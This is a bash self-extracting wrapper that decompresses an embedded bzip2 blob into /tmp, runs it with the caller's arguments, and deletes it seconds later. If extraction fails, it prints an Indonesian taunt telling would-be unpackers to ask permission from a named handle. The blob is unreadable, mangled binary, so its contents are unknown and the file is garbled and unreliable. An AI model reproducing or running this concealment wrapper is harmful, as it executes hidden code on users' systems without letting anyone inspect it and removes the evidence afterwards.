#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY!t	 S_�u������������PD@  `n�H��1�@  	D@�i�Jz�Q�=&�CC�14ڍ1��'�� �I�'��O�jd�i�&	��`��4�4�p� �@`�i�d � OH�Sz���jhS@  � i����  4 A�� ��dCF� 1@D�d	��*o��zj��5&����l�jy@4ʛA��BD@���q2o�kɣ��XP�S:�W����������Z���(�e��
 �Ӯ�pyg�0�,�D����4,��
	�q��y�����3�S�/	+r,�aSz���Inn�h���M��0,]$�@8ҡ�wq��u�Jø�� ���Ɔ�k��s� ,�hm^�tc�'�;2��(�6Ȭ�*�UYq)۸��E	hՌ�)yj�佀�-�vV�3��9ɭ�����r��ǣ}�%��F�s�FQ����3E�k�57u�;b�X��l������=�
��qP2����SR���`w�l����>���E�%E
(�p��@�0?9��}�����>�u���\M�|DJ��^��N��f	�g2"M�mρ����p����RK��\@{�oo�TDt��K&��ܮQ�8�&�J��axY	!"9F5����S//��c�oW�A�a2.�kvRpJ^���<��5r@Y^݊e�e+ٕ���Gpz��l�'��� f�>'��fڲ�;D���;9S��
��p�ܥ���e3�5;���i���,c0vzF���;0�=m@�dU�D�Xc׉v�ͼ��Q�42`,��i�"7�BHq�aT���Z"
���QBH6k���v���� �2�ɏM{�a�����x�ݺ4zdeiQ�>�R%z�՝�­�L&��`�i��K�� z���������S�.<Կ����+c�<L�����T�O�� 6��xF������7ݼ"�~��-����VlZƒQ��<d������m���<:���TY�-�mU����Ԫ�������m������T���;/��od%��說�^�)0`�c�AeFZ�j~B>5���Hwv��hnh�*ʡb3AQ�A�vV�\�7w��UU�NP�A�"//��倡�)"��Ao�j��O}��:�=��]{�3�a���G$��#<2$�V�CQ.Cae�_�P�	��?�M,�l6\O��9Y�������>3��aP���0S�N�p��+����u���< �����r����꼋d���;B��4)�̍��^��n/�w4��Nr48�� ����*#s�4��ʹ��T ANdn���j�^�؂
�eܯ=��>i>u4��~���k�O;��kI�D���g~��#�Ff��n�Jd�^�EA[��
LH���y�{���f۲K��KIT.�e����,,E�j��Щ /��į'��dO?�*�]F�+hZ}�fw�v�f�ui���[<w#P��/gˍ��z�j/V��Y�BEN @D�>Y�	���j����z1��Ue���=ۅ3����=��*�J �x��j@c��[�4Q}� Z6h��lz"4i�ZT.{����v�CD��H9 �ʿ)��_?���D|��	�L?o��0 U�c��ܑN$H]@